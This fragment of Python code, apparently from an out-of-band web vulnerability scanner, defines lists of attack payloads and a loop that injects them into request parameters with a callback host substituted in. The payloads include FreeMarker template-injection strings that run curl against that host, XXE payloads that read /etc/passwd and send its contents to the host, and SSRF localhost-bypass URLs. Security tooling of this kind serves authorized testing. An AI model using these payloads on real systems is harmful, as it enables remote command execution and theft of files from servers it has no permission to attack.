    ...
    def __init__(self, callback_host: str = None):
        ...
        self.oob_payloads = {
            'ssti': {
                ...
                'freemarker': [
                    "${{'freemarker'}}.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().getPath()}",
                    "${{'freemarker'}}.getClass().forName('java.lang.Runtime').getRuntime().exec('curl http://{host}/freemarker')}",
                    "${{'freemarker'}}.getClass().forName('java.net.URL').newInstance('http://{host}/freemarker').openConnection().getInputStream()}"
                ],
                'twig': [
            ...
            'xxe': {
                'generic': [
                    '<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://{host}/xxe">]><root>&xxe;</root>',
                    '<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                    '<!DOCTYPE xxe [<!ENTITY % xxe SYSTEM "http://{host}/xxe.dtd"> %xxe;]><root/>',
                    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{host}/xxe.dtd">%remote;]><root/>'
                ],
                'blind': [
                    '<!DOCTYPE xxe [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'http://{host}/xxe?p=%file;\'>">%eval;%error;]><root/>',
                    '<!DOCTYPE xxe [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'http://{host}/xxe?p=%file;\'>">%eval;%error;]><root/>',
                    '<!DOCTYPE xxe [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'http://{host}/xxe?p=%file;\'>">%eval;%error;]><root/>'
                ]
            },
            'ssrf': {
                ...
                'bypass': [
                    ...
                    'http://127.0.1',  # Shortened IP
                    'http://localhost.localdomain',
                    'http://localhost.local',
                    'http://127.0.0.1.xip.io',
                    'http://127.0.0.1.nip.io',
                    'http://127.0.0.1.burpcollaborator.net'
                ]
            }
        }
            ...
            for param in params:
                for engine, payloads in self.oob_payloads['ssti'].items():
                    for payload in payloads:
                        try:
                            test_payload = payload.replace('{host}', self.callback_host)
